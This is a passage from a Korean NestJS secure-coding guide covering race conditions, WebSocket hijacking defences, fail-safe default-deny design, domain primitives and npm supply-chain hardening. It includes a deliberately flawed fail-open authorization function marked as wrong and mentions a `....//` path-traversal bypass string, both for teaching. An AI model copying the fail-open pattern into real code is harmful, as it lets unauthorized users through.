  where: { id, usedAt: null, userId: user.sub }, data: { usedAt: new Date() },
});
if (count === 0) throw new ConflictException('이미 사용되었거나 사용할 수 없는 쿠폰');
```

- 요청 처리 중 상태는 **요청 범위 변수**에만 둡니다. 싱글톤 Service에 `this.currentUser` 같은 필드를 두지 않습니다.
- 경쟁 상태는 부하가 있어야 드러나므로, 동시 요청 N개를 쏘는 테스트를 23절 보안 테스트에 추가합니다.

> 🔗 NestJS 연결: Nest의 provider는 기본 **싱글톤**이므로 인스턴스 필드에 요청별 데이터를 두면 요청 간에 섞입니다. 요청 데이터는 인자로 넘기거나 `REQUEST` 스코프/AsyncLocalStorage를 씁니다.

> 📖 원문: 웹 보안 완전 가이드 29.2(사례 12 로그인과 경쟁하기), 29.4(자작 할인 쿠폰), 29.7(로직 결함을 피하는 설계 습관)

### 30. WebSocket 보안 기초

Part 5의 18절은 WebSocket을 통신 방식으로만 소개했습니다. 보안 관점의 핵심은 <strong>"연결을 여는 한 번의 HTTP 요청(핸드셰이크) 이후에는 HTTP 단위 통제가 사라진다"</strong>는 점입니다.

#### 30.1 크로스 사이트 WebSocket 하이재킹(CSWSH)
- 핸드셰이크는 HTTP라서 **브라우저가 쿠키를 자동으로 붙입니다.** 쿠키 인증 + Origin 미검사면, 악성 사이트가 피해자 브라우저로 우리 서버에 연결을 엽니다.
- 일반 CSRF는 응답을 못 읽지만, WebSocket은 **양방향**이라 서버가 보내는 데이터를 공격자가 읽어 갑니다.
- 그리고 CORS는 WebSocket에 적용되지 않습니다(보충). `enableCors` 설정이 지켜주지 않습니다.

#### 30.2 방어 체크

| 항목 | 내용 |
|---|---|
| **Origin 정확히 일치** | 핸드셰이크의 `Origin`을 허용 목록과 스킴·호스트·포트까지 비교. 포함(`includes`) 검사 금지. 불일치면 거부 |
| **핸드셰이크에서 인증** | 쿠키 대신 토큰 전달을 권장(브라우저 API는 커스텀 헤더 불가 → 연결 `auth` 페이로드나 첫 메시지). (보충) 쿼리스트링 토큰은 로그에 남으니 피함 |
| Origin ≠ 인증 | Origin은 브라우저 밖(curl·스크립트)에서는 마음대로 위조됨. 브라우저 속임수만 막고, 아무 클라이언트의 접속은 **인증**이 막음 |
| **메시지마다 인가** | "방(room) 구독" 요청마다 그 방이 사용자 테넌트 소유인지 확인 (8절 BOLA와 동일) |
| 메시지 검증·크기 제한 | 메시지 본문도 입력. 스키마 검증, 최대 프레임 크기 지정 |
| 속도 제한 | 연결 수·메시지 수 제한. WAF는 업그레이드 이후 프레임을 보지 못함 |
| `wss://`만 사용 | TLS로 암호화, 중간 프록시 오작동 감소 |
| 긴 연결의 토큰 만료 (보충) | 연결 중 토큰이 만료·폐기되면 재검증하거나 연결을 끊음 |

```ts
@WebSocketGateway({ cors: { origin: ['https://app.example.com'] } })
export class EventsGateway implements OnGatewayConnection {
  async handleConnection(client: Socket) {
    try { client.data.user = await this.auth.verify(client.handshake.auth?.token); }
    catch { client.disconnect(true); }   // 인증 실패 시 즉시 종료
  }
}
```

> 🔗 NestJS 연결: Gateway에도 `@UseGuards()`·`@UsePipes(ValidationPipe)`를 메시지 핸들러 단위로 붙일 수 있습니다. 속도 제한은 `ThrottlerGuard`를 상속한 WS 전용 Guard를 Gateway에 직접 바인딩해야 합니다(전역 등록 불가).

> 📖 원문: 웹 보안 완전 가이드 33.7(크로스 사이트 WebSocket 하이재킹), 37.7(WebSocket 보안: Origin·인증·하이재킹·프록시) / NestJS 교재 26장(WebSockets)

### 31. 안전한 실패(Fail-safe)와 도메인 프리미티브

공격 하나하나를 막는 것보다 **실수해도 안전한 쪽으로 넘어지는 구조**를 만드는 설계 원칙입니다. Part 4의 값 객체(Value Object)를 보안 관점으로 다시 봅니다.

#### 31.1 Fail-open을 피하고 기본 거부(default deny)로
```ts
// ❌ fail-open: 검증 중 예외(DB 장애, 형식 오류)를 삼키면 "통과"로 흘러감
async canAccess(user, doc) {
  try { if (!(await this.acl.check(user, doc))) return false; }
  catch (e) { this.logger.warn(e); }
  return true;            // 예외가 나면 여기 도달 → 허용!
}
```
- 교재의 사례는 로그인 코드가 예외를 빈 `catch`로 삼켜 **파라미터를 빼고 보내면 로그인이 성공**하던 결함입니다.
- 원칙:
  - 판단 코드는 **"허용" 경로가 딱 하나**이고 나머지(예외 포함)는 모두 거부.
  - 규칙은 **허용 목록 + 마지막 규칙 "그 외 전부 거부"**. 금지 목록(열거)은 빠진 것 앞에서 무력합니다.
  - 의존 서비스(인가 서버, 플래그 서비스)가 죽으면 **닫힌 상태로** 실패. 가용성 때문에 열어야 한다면 그 결정을 문서화합니다.

#### 31.2 검증의 순서
교재는 입력 검증을 **싼 것부터 비싼 것 순서**로 5단계로 나눕니다. 앞 단계가 뒤 단계를 보호합니다(예: 크기 제한이 파서·ReDoS를 보호).

| 순서 | 단계 | 질문 | 예 |
|---|---|---|---|
| 1 | 출처 | 정당한 발신자인가 | 서명·인증 확인, 웹훅 서명 |
| 2 | 크기 | 크기가 합리적인가 | 본문·문자열 길이 상한 |
| 3 | 어휘 | 허용 문자·인코딩만 있나 | 영숫자만, UTF-8 |
| 4 | 구문 | 형식이 맞나 | 이메일·UUID 형식, JSON 파싱 |
| 5 | 의미 | 이 맥락에서 말이 되나 | 그 주문이 존재하고 내 것인가 (DB 조회) |

- **검증 전에 고치지 않는다**: 이상한 입력을 정제해 살리려 하면 우회가 생깁니다(26.1의 `....//`). 거부가 기본입니다.

#### 31.3 도메인 프리미티브(Domain Primitive)
- 값 객체 중에서 **생성 시점에 불변식을 강제**하는 것. "존재한다면 유효하다, 유효하지 않으면 만들어질 수 없다."
- `string`은 무엇이든 담기 때문에 받는 쪽이 매번 다시 검증해야 하고, 한 곳만 잊어도 인젝션이 생깁니다. 타입으로 **검증되지 않은 문자열이 깊은 곳까지 오지 못하게** 막습니다.

```ts
export class TenantSlug {
  private constructor(readonly value: string) {}
  static of(raw: string): TenantSlug {
    if (raw.length > 40 || !/^[a-z0-9-]+$/.test(raw)) throw new DomainError('invalid slug');
    return new TenantSlug(raw);
  }
}
// 저장소 시그니처가 string 대신 TenantSlug를 요구 → 검증을 건너뛴 호출이 컴파일되지 않음
interface TenantRepository {
  findTenant(slug: TenantSlug): Promise<Tenant | null>;
}
```

- 파라미터 바인딩(SQL)과 경쟁 관계가 아닙니다. 바인딩은 "데이터가 명령이 되지 않게", 도메인 프리미티브는 "오염된 데이터가 그 자리에 오지 않게" 합니다. 둘 다 씁니다.
- **읽기 1회 객체(read-once)**: 비밀번호·카드번호 같은 비밀은 한 번만 값을 꺼낼 수 있게 감싸고, `toString()`/`toJSON()`은 가린 값을 돌려주게 만듭니다. 로그·예외·직렬화로 새는 실수를 막거나 드러냅니다(22.3절과 연결).

> 🔗 NestJS 연결: DTO(Pipe)는 경계에서 1~4단계를, 도메인 프리미티브와 Service는 5단계를 맡습니다. 인증 Guard는 전역 등록 후 `@Public()`으로만 예외를 여는 **기본 거부** 구조로 둡니다.

> 📖 원문: 웹 보안 완전 가이드 22.6(fail-open 로그인), 24.6(기본 거부 모델), 27.10(도메인 프리미티브로 인젝션 차단), 43.4(검증의 순서), 44.1·44.5(도메인 프리미티브·읽기 1회 객체), 45.6(검증 전에 복구하지 말라)

### 32. 공급망(Supply Chain) 보안과 실행 권한

Part 6의 3.6절("의존성도 입력이다")을 Node.js 실무 규칙으로 구체화합니다.

#### 32.1 왜 위험한가
- Node.js는 실행하라고 받은 코드(= `node_modules` 전체)를 **완전히 신뢰**하며, 그 코드는 앱과 같은 권한(환경 변수·파일·네트워크)을 가집니다.
- 실제 npm 사고의 대부분은 <strong>설치 스크립트(`preinstall`/`postinstall`)</strong>로 일어납니다. 이름이 비슷한 가짜 패키지(**타이포스쿼팅**)나 탈취된 유지보수자 계정으로 배포 → 설치 순간 환경 변수 유출.

#### 32.2 실무 규칙

| 규칙 | 설명 |
|---|---|
| lockfile 커밋 + **`npm ci`** | CI·이미지 빌드는 lockfile 그대로 설치, 불일치면 실패 |
| **`--ignore-scripts`** 기본 | CI·Docker 빌드에서 설치 스크립트 차단, 꼭 필요한 네이티브 모듈만 예외 허용 |
| `npm audit`은 신호일 뿐 | 이미 **알려진** 취약점만 찾음. 내가 그 코드에 도달하는지 판단해 우선순위를 정하고, `audit fix --force`는 주의 |
| 이름 확인·출처 확인 | 설치 전 패키지명 철자·다운로드 수·저장소 확인. provenance(빌드 출처 증명) 있는 패키지 선호 |
| 의존성 줄이기 | 작은 유틸 하나가 신뢰 대상 여러 개를 끌고 옴. 짧은 코드는 직접 작성 |
| 새 버전 지연 반영 (보충) | 사내 레지스트리 프록시·Renovate 등으로 공개 직후 버전을 바로 받지 않음 |

#### 32.3 최소 권한으로 실행
- 컨테이너에서 **root가 아닌 사용자**로 실행하고, 쓰기 가능한 경로를 최소화합니다.
- Node의 **권한 모델(`--permission`, `--allow-fs-read` 등)** 은 "안전벨트"입니다. 내 코드의 실수(엉뚱한 파일 쓰기)를 막는 용도이지, 악성 코드를 가두는 **샌드박스가 아닙니다**(공식 문서 명시). 신뢰할 수 없는 코드는 OS 수준(별도 사용자·컨테이너)으로 격리합니다.

> 🔗 NestJS 연결: Nest CLI 프로젝트도 결국 npm 의존성 트리입니다. `Dockerfile`의 설치 단계를 `npm ci --ignore-scripts` + `USER node`로 두는 것이 가장 싼 방어입니다.

### ✅ 이 부 핵심 체크리스트

- [ ] 새 기능마다 "무엇이 잘못될 수 있나?"를 STRIDE로 짚었고, 대응(완화/제거/이전/수용)을 정했다.
- [ ] 모든 엔드포인트가 기본 인증 잠금이며, **외부/내부 구분 없이** 인증·인가를 적용한다.
- [ ] 모든 조회/수정 쿼리에 **소유자·테넌트 조건**이 들어간다 (BOLA 방지). 존재 노출이 민감하면 404.
- [ ] 입력은 **DTO 화이트리스트**(추가 속성 거부)로, 응답은 **응답 DTO**로만 내보낸다. 엔티티를 그대로 반환하지 않는다.
- [ ] 서버 전용 필드(`id`, `status`, `role`, `tenantId`)는 입력으로 받지 않는다.
- [ ] 숫자·문자열·정렬·페이지네이션 파라미터에 **상한/열거형 제약**이 있다. 외부 ID는 예측 불가(UUID).
- [ ] JWT 검증: **알고리즘 고정, `iss`/`aud`/`exp` 검증**, 짧은 만료, PII 금지, 리프레시 토큰 회전.
- [ ] 로그인·재설정·무거운 엔드포인트에 **엔드포인트별 속도 제한**과 브루트포스 방어가 있다.
- [ ] 사용자가 준 URL을 서버가 호출할 때 SSRF 방어(허용 목록, 사설/메타데이터 IP 차단)가 있다.
- [ ] 에러 응답에 스택/쿼리가 없고, 로그에 **토큰·비밀번호·카드·PII가 남지 않는다**. 요청 ID로 추적한다.
- [ ] 외부 API 응답도 스키마 검증하고, 타임아웃·서킷 브레이커를 둔다.
- [ ] OpenAPI 스펙과 API 목록을 유지하고, 옛 버전은 `Deprecation`/`Sunset`으로 폐기를 자동화한다.
- [ ] BOLA, 인증 누락, RBAC 우회, 쿠폰 남용 테스트가 CI에서 자동으로 돈다.
- [ ] 요청 본문을 깊은 병합하지 않고, 사용자 입력이 `eval`·`exec`(셸)·파일 경로·리다이렉트 목적지에 직접 닿지 않는다(`execFile`, UUID 파일명, 상대 경로 검증).
- [ ] 비밀번호 재설정·이메일 인증 토큰은 일회용·짧은 만료·해시 저장이며, 링크는 `Host` 헤더가 아닌 설정된 기준 URL로 만들고, 응답으로 계정 존재 여부를 알 수 없다.
- [ ] 쿠폰·잔액·재고처럼 "확인 후 변경"하는 로직은 조건부 원자적 갱신이나 유니크 제약으로 처리해 동시 요청에도 한 번만 성공한다.
- [ ] WebSocket은 핸드셰이크에서 Origin 정확 일치와 인증을 확인하고, 메시지마다 인가·검증·속도 제한을 적용한다.
- [ ] 권한 판단은 예외 시 거부(fail-safe)되고, CI는 `npm ci --ignore-scripts`로 설치하며 컨테이너는 root가 아닌 사용자로 실행한다.
